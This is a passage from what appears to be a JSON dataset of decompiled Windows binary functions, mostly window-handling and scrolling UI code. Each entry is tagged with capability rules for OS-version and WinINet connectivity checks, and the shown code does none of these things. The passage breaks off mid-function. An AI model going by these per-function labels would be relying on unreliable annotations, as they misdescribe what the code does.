        "decompiled_code": "\nvoid __fastcall fcn.0044e178(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    fcn.00403ffc();\n    iVar3 = 1;\n    do {\n        iVar2 = fcn.00404268();\n        if (iVar2 < iVar3) {\n            return;\n        }\n        uVar1 = *(*param_2 + -1 + iVar3);\n        if ((*(*0x4621f4 + (uVar1 >> 3)) >> (uVar1 & 7) & 1) == 0) {\n            if (uVar1 == 0x26) {\n                if ((*(*0x462210 + 0xc) != '\\0') && (1 < iVar3)) {\n                    iVar2 = fcn.00404268();\n                    if ((1 < iVar2 - iVar3) && ((*(*param_2 + -2 + iVar3) == '(' && (*(*param_2 + 1 + iVar3) == ')'))))\n                    {\n                        fcn.00404508();\n                        goto code_r0x0044e1fd;\n                    }\n                }\n                fcn.00404508();\n            }\n        }\n        else {\n            iVar3 = iVar3 + 1;\n        }\ncode_r0x0044e1fd:\n        iVar3 = iVar3 + 1;\n    } while( true );\n}\n",
        "token_count": 317
    },
    "004503e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004503e8(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h != *0x461ce0) && (arg_8h != *(*0x463bb0 + 0x30))) {\n        iVar1 = sub.user32.dll_IsWindowVisible(arg_8h);\n        if (iVar1 != 0) {\n            iVar1 = sub.user32.dll_IsWindowEnabled(arg_8h);\n            if (iVar1 != 0) {\n                uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n                if ((uVar2 & 8) == 0) {\n                    if (*0x461ce4 == 0) {\n                        *0x461ce4 = arg_8h;\n                    }\n                }\n                else if (*0x461ce8 == 0) {\n                    *0x461ce8 = arg_8h;\n                }\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 233
    },
    "0045044c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0045044c(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    *0x461ce4 = 0;\n    *0x461ce8 = 0;\n    *0x461ce0 = in_EAX;\n    uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.004503e8, 0);\n    sub.user32.dll_EnumThreadWindows(uVar1);\n    if (*0x461ce4 != 0) {\n        return *0x461ce4;\n    }\n    return *0x461ce8;\n}\n",
        "token_count": 133
    },
    "00450848": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00450848(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x18) == '\\0') {\n        cVar1 = fcn.00450a00();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.00439b94();\n            if (cVar1 == '\\0') {\n                fcn.00450f50();\n            }\n            else {\n                fcn.00450f50();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00450880": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00450880(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        cVar1 = *(in_EAX + 0x5b);\n        if ((cVar1 == '\\0') || (cVar1 == '\\x03')) {\n            if ((*(in_EAX + 0x5b) == '\\x03') || (*0x4508e8 == (*0x4508e4 & *(in_EAX + 0x61)))) {\n                uVar2 = fcn.00423d80();\n                *(arg_8h + -4) = uVar2;\n            }\n        }\n        else if (cVar1 == '\\x04') {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x48);\n        }\n    }\n    return;\n}\n",
        "token_count": 227
    },
    "004508ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004508ec(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        if (*(in_EAX + 0x5b) < 2) {\n            if ((*(in_EAX + 0x5b) == '\\x01') || (*0x450950 == (*0x45094c & *(in_EAX + 0x61)))) {\n                uVar1 = fcn.00423d80();\n                *(arg_8h + -4) = uVar1;\n            }\n        }\n        else if (*(in_EAX + 0x5b) == 2) {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x4c);\n        }\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "00450954": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00450954(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 4) + 0x84) != '\\0') {\n        cVar1 = (**(**(in_EAX + 4) + 200))();\n        if (cVar1 == '\\0') {\n            fcn.00451088();\n        }\n        else {\n            iVar2 = fcn.0043ca38();\n            if (-1 < iVar2 + -1) {\n                do {\n                    if (*(in_EAX + 0x18) == '\\0') {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.0043c9fc();\n                        fcn.00450880(puVar3);\n                    }\n                    else {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.0043c9fc();\n                        fcn.004508ec(puVar3);\n                    }\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            fcn.00451088();\n        }\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "00450a00": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00450a00(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (*(in_EAX + 0x18) == '\\x01') {\n        uVar3 = 0x200000;\n    }\n    if (*(in_EAX + 0x1c) != '\\0') {\n        uVar1 = fcn.0043fd08(0xfffffff0);\n        uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n        if ((uVar2 & uVar3) != 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 169
    },
    "00450a6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00450a6c(int32_t arg_8h)\n\n{\n    char cVar1;\n    ushort in_DX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (*(arg_8h + -5) == '\\0') {\n        if ((*(arg_8h + -6) != '\\0') && (cVar1 = fcn.00450a38(arg_8h),  cVar1 == '\\0')) {\n            iVar2 = (***0x461f44)(in_DX);\n            return -(iVar2 - *(arg_8h + -0xc));\n        }\n        if ((*(arg_8h + -6) == '\\0') && (cVar1 = fcn.00450a38(arg_8h),  cVar1 != '\\0')) {\n            iVar2 = (***0x461f44)(in_DX);\n            iVar2 = iVar2 - *(arg_8h + -0xc);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 226
    },
    "00450be0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00450be0(uint param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1f) == '\\0') || (3 < *(param_2 + 4))) {\n        uVar3 = *(param_2 + 4);\n    // switch table (8 cases) at 0x450db1\n        switch(*(param_2 + 4)) {\n        case 0:\n            uVar3 = fcn.00450f50();\n            break;\n        case 1:\n            uVar3 = fcn.00450f50();\n            break;\n        case 2:\n            fcn.00450ae8();\n            uVar3 = fcn.00450f50();\n            break;\n        case 3:\n            fcn.00450ae8();\n            uVar3 = fcn.00450f50();\n            break;\n        case 4:\n            if (*(in_EAX + 0x14) < 0x8000) {\n                uVar3 = fcn.00450f50();\n            }\n            else {\n                fcn.00450b80(&stack0xfffffffc);\n                uVar3 = fcn.00450f50();\n            }\n            break;\n        case 5:\n            uVar3 = in_EAX;\n            if (*(in_EAX + 0x1d) != '\\0') {\n                if (*(in_EAX + 0x14) < 0x8000) {\n                    uVar3 = fcn.00450f50();\n                }\n                else {\n                    fcn.00450b80(&stack0xfffffffc);\n                    uVar3 = fcn.00450f50();\n                }\n            }\n            break;\n        case 6:\n            uVar3 = fcn.00450f50();\n            break;\n        case 7:\n            uVar3 = fcn.00450f50();\n        }\n    }\n    else {\n        if (*(param_2 + 4) < 2) {\n            iVar5 = *(in_EAX + 0x40);\n            uVar3 = *(in_EAX + 8) / iVar5;\n            var_10h = *(in_EAX + 8) % iVar5;\n        }\n        else if (*(param_2 + 4) - 2 < 2) {\n            iVar5 = *(in_EAX + 0x3c);\n            var_10h = *(in_EAX + 10) % iVar5;\n            uVar3 = *(in_EAX + 10) / iVar5;\n        }\n        else {\n            iVar5 = 0;\n            uVar3 = 0;\n            var_10h = 0;\n        }\n        iVar2 = 0;\n        for (; 0 < iVar5; iVar5 = iVar5 + -1) {\n            iVar4 = fcn.00406908();\n            if (iVar4 - iVar2 < *(in_EAX + 0x20)) {\n                sub.kernel32.dll_Sleep_1(*(in_EAX + 0x20) - (iVar4 - iVar2));\n            }\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.00450f50();\n            }\n            else if (iVar1 == 1) {\n                fcn.00450f50();\n            }\n            else if (iVar1 == 2) {\n                fcn.00450f50();\n            }\n            else if (iVar1 == 3) {\n                fcn.00450f50();\n            }\n            uVar3 = (**(**(in_EAX + 4) + 0x88))();\n            iVar2 = iVar4;\n        }\n        if (0 < var_10h) {\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                uVar3 = fcn.00450f50();\n            }\n            else if (iVar1 == 1) {\n                uVar3 = fcn.00450f50();\n            }\n            else if (iVar1 == 2) {\n                uVar3 = fcn.00450f50();\n            }\n            else {\n                uVar3 = param_2 & 0xffff0000 | iVar1 - 3U;\n                if (iVar1 - 3U == 0) {\n                    uVar3 = fcn.00450f50();\n                }\n            }\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 1046
    },
    "00450f50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450f50(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    if ((*(*(in_EAX + 4) + 0x1c) & 2) == 0) {\n        iVar1 = *(in_EAX + 0x14);\n        if ((param_2 <= iVar1) && (iVar1 = param_2,  param_2 < 0)) {\n            iVar1 = 0;\n        }\n        bVar3 = *(in_EAX + 0x18) != '\\0';\n        if (iVar1 != *(in_EAX + 0xc)) {\n            *(in_EAX + 0xc) = iVar1;\n            if (*(in_EAX + 0x18) == '\\0') {\n                fcn.0043f8c0();\n            }\n            else {\n                fcn.0043f8c0();\n            }\n            if ((((*(*(in_EAX + 4) + 0x1c) & 0x10) != 0) && (iVar1 = fcn.004506c0(),  iVar1 != 0)) &&\n               (*(iVar1 + 0x250) != 0)) {\n                (**(**(iVar1 + 0x250) + 0xc))();\n            }\n        }\n        uVar2 = fcn.0043fd08(bVar3);\n        iVar1 = (***0x461fb4)(uVar2);\n        if (iVar1 != *(in_EAX + 0xc)) {\n            uVar2 = fcn.0043fd08(bVar3, *(in_EAX + 0xc), 0xffffffff);\n            (***0x4621d0)(uVar2);\n        }\n    }\n    else {\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 431
    },
    "004510cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004510cc(int32_t arg_8h)\n\n{\n    char in_AL;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t arg_14h;\n    \n    piVar3 = arg_8h + -4;\n    arg_14h = -(in_AL != '\\0');\n    uVar4 = *(*(*piVar3 + 0x34) * 4 + 0x461d28);\n    uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x461d00);\n    uVar1 = fcn.0043fd08();\n    fcn.004259a8(uVar1, uVar2, uVar4, arg_14h);\n    if (0 < *(*piVar3 + 0x24)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x24);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x461d04);\n        uVar1 = fcn.0043fd08();\n        fcn.004259a8(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x38)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x38);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x461d08);\n        uVar1 = fcn.0043fd08();\n        fcn.004259a8(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x30)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x30);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x461d0c);\n        uVar1 = fcn.0043fd08();\n        fcn.004259a8(uVar1, uVar2, uVar4, uVar5);\n    }\n    uVar5 = 0;\n    uVar2 = fcn.0041c430();\n    uVar4 = *(*(*piVar3 + 0x18) * 0x14 + 0x461d10);\n    uVar1 = fcn.0043fd08();\n    fcn.004259a8(uVar1, uVar4, uVar2, uVar5);\n    return;\n}\n",
        "token_count": 600
    },
    "004511d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004511d4(uint param_1, uchar param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    int32_t var_12h;\n    uint var_eh;\n    uint var_ah;\n    int32_t var_6h;\n    \n    *(in_EAX + 0x14) = 0;\n    cVar1 = *(in_EAX + 0x18);\n    var_6h._1_1_ = param_2;\n    unique0x100000a4 = in_EAX;\n    if (*(in_EAX + 0x1c) != '\\0') {\n        iVar2 = fcn.00450ae8();\n        iVar2 = *(stack0xfffffff8 + 0x10) - iVar2;\n        *(stack0xfffffff8 + 0x14) = iVar2;\n        if (iVar2 < 0) {\n            *(stack0xfffffff8 + 0x14) = 0;\n        }\n    }\n    var_22h = 0x1c;\n    var_1eh = 0x17;\n    var_1ah = 0;\n    if (*(stack0xfffffff8 + 0x14) < 1) {\n        var_16h = 0;\n    }\n    else {\n        var_16h = *(stack0xfffffff8 + 0x10);\n    }\n    var_12h = fcn.00450ae8();\n    var_12h = var_12h + 1;\n    var_eh = *(stack0xfffffff8 + 0xc);\n    var_ah = var_eh;\n    fcn.004510cc(&stack0xfffffffc);\n    *(stack0xfffffff8 + 0x44) = 0;\n    uVar3 = fcn.0043fd08(cVar1 == '\\x01', &var_22h, 0xffffffff);\n    (***0x462084)(uVar3);\n    fcn.00450f50();\n    iVar2 = fcn.00450ae8();\n    uVar4 = (iVar2 * 9) / 10;\n    *(stack0xfffffff8 + 10) = uVar4;\n    if (*(stack0xfffffff8 + 0x1f) != '\\0') {\n        *(stack0xfffffff8 + 8) = (uVar4 & 0xffff) / 10;\n    }\n    return;\n}\n",
        "token_count": 596
    },
    "004513b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004513b0(void)\n\n{\n    char cVar1;\n    uint arg_8h;\n    \n    fcn.0043ccc0();\n    if (*(*0x462210 + 0xd) == '\\0') {\n        cVar1 = fcn.0040bd68();\n        if (cVar1 == '\\0') {\n            arg_8h = fcn.0043fd08();\n            fcn.004259dc(arg_8h);\n        }\n    }\n    fcn.004515c8();\n    return;\n}\n",
        "token_count": 120
    },
    "00451430": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00451430(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00403228();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar4 = fcn.00438f30();\n    iVar5 = *(in_EAX + 0x208);\n    cVar2 = fcn.00450a00();\n    if ((cVar2 == '\\0') || (*(iVar5 + 0x10) <= iVar4)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        fcn.00450f50();\n    }\n    iVar5 = fcn.0043ca38();\n    if (-1 < iVar5 + -1) {\n        do {\n            fcn.0043c9fc();\n            fcn.0043c9fc();\n            fcn.00413a08();\n            fcn.00438c9c();\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    iVar5 = *(iVar3 + 8);\n    if (-1 < iVar5 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00413b64();\n            fcn.0043a6d4(arg_8h);\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    if (bVar1) {\n        fcn.00450848();\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00403258();\n    return;\n}\n",
        "token_count": 437
    },
    "00451548": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00451548(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x214) < 1) {\n        fcn.00450954();\n        fcn.00450954();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "004515c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004515c8(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x218) == '\\0') {\n        puStack12 = 0x4515e7;\n        var_4h = in_EAX;\n        cVar1 = fcn.0044000c();\n        if (cVar1 != '\\0') {\n            uStack16 = 0x4516b3;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            *(var_4h + 0x218) = 1;\n            puStack12 = &stack0xfffffffc;\n            cVar1 = fcn.00450b68();\n            if (cVar1 == '\\0') {\n                cVar1 = fcn.00450b68();\n                if (cVar1 == '\\0') {\n                    fcn.004511d4();\n                    fcn.004511d4();\n                }\n                else {\n                    fcn.004511d4();\n                    fcn.004511d4();\n                }\n            }\n            else {\n                fcn.004511d4();\n                fcn.004511d4();\n            }\n            *in_FS_OFFSET = uStack20;\n            *(var_4h + 0x218) = 0;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "00451ce0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00451ce0(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint uVar3;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.004512ec();\n    *(in_EAX + 0x50) = *0x451e54;\n    fcn.00438c9c();\n    fcn.00438cc0();\n    fcn.00438ce8();\n    fcn.00438d0c();\n    piVar2 = fcn.004232c4();\n    *(in_EAX + 0x240) = piVar2;\n    (***0x461f44)(0x31);\n    (**(*piVar2 + 0x40))();\n    (***0x461f44)();\n    (**(**(in_EAX + 0x240) + 0x34))();\n    iVar1 = *(in_EAX + 0x240);\n    *(iVar1 + 0x14) = in_EAX;\n    *(iVar1 + 0x10) = fcn.004525fc;\n    uVar3 = fcn.0041d20c();\n    *(in_EAX + 0x238) = uVar3;\n    fcn.00438108();\n    *(in_EAX + 0x228) = *0x451e58;\n    *(in_EAX + 0x229) = 2;\n    *(in_EAX + 0x22b) = 0;\n    *(in_EAX + 0x231) = 3;\n    *(in_EAX + 0x244) = 0;\n    *(in_EAX + 0x25c) = *(*0x463bb4 + 0x40);\n    *(in_EAX + 0x235) = 1;\n    uVar3 = fcn.004031a0();\n    *(in_EAX + 0xb8) = uVar3;\n    *(in_EAX + 0x2e1) = 0xff;\n    *(in_EAX + 0x2ec) = 0;\n    fcn.00452960();\n    fcn.004396f0();\n    fcn.00439658();\n    fcn.0043fe48();\n    fcn.00456fc4();\n    *(in_EAX + 0x2e4) = 10;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = 0x32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 643
    },
    "00451ec4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00451ec4(void)\n\n{\n    char cVar1;\n    uchar extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    int32_t *var_5h;\n    \n    puStack16 = 0x451ecf;\n    *NULL = fcn.004035e4();\n    var_5h._0_1_ = extraout_DL;\n    if ((*(*NULL + 7) & 8) == 0) {\n        puStack16 = 0x451eea;\n        (**(***0x4621d8 + 0x14))();\n    }\n    uStack20 = 0x451f8e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    if (*(stack0xfffffff8 + 0x8d) != '\\0') {\n        puStack16 = &stack0xfffffffc;\n        (**(*stack0xfffffff8 + 0xd8))();\n    }\n    fcn.004547e8();\n    cVar1 = fcn.0044000c();\n    if (cVar1 != '\\0') {\n        (**(*stack0xfffffff8 + 0xac))();\n    }\n    fcn.00456ffc();\n    fcn.00403258();\n    fcn.00403258();\n    fcn.0040cf1c();\n    fcn.00451364();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x451f95;\n    uStack20 = 0x451f8d;\n    (**(***0x4621d8 + 0x18))();\n    return;\n}\n",
        "token_count": 400
    },
    "00451fa8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00451fa8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x2d2) != 0) {\n        uStack28 = 0x451fe9;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        (**(in_EAX + 0x2d0))();\n        *in_FS_OFFSET = uStack32;\n    }\n    if ((*(in_EAX + 0x2f4) & 2) != 0) {\n        puStack24 = 0x45201e;\n        fcn.00452960();\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00452024": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00452024(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x2da) != 0) {\n        uStack28 = 0x452065;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        (**(in_EAX + 0x2d8))();\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "004521cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004521cc(void)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x4521df;\n    fcn.0043c5a0();\n    uStack24 = 0x452422;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    *(in_EAX + 0x268) = 0;\n    *(in_EAX + 0x26c) = 0;\n    *(in_EAX + 0x270) = 0;\n    bVar1 = false;\n    *(in_EAX + 0x234) = *0x463661 ^ 1;\n    puStack20 = &stack0xfffffffc;\n    fcn.0043bcfc();\n    if ((*(in_EAX + 0x25c) != 0) && (0 < *(in_EAX + 0x270))) {\n        if (((*(in_EAX + 0x98) & 0x10) != 0) && (*(in_EAX + 0x25c) != *(*0x463bb4 + 0x40))) {\n            uVar2 = fcn.0041cad0(*(*0x463bb4 + 0x40), *(in_EAX + 0x25c));\n            sub.kernel32.dll_MulDiv(uVar2);\n            fcn.0041cad8();\n        }\n        *(in_EAX + 0x25c) = *(*0x463bb4 + 0x40);\n        iVar3 = fcn.00452554();\n        if (iVar3 != *(in_EAX + 0x270)) {\n            bVar1 = true;\n            fcn.0045182c();\n            fcn.0043f7cc();\n            if ((*(in_EAX + 0x98) & 4) != 0) {\n                uVar2 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x268), iVar3, *(in_EAX + 0x270));\n                *(in_EAX + 0x268) = uVar2;\n            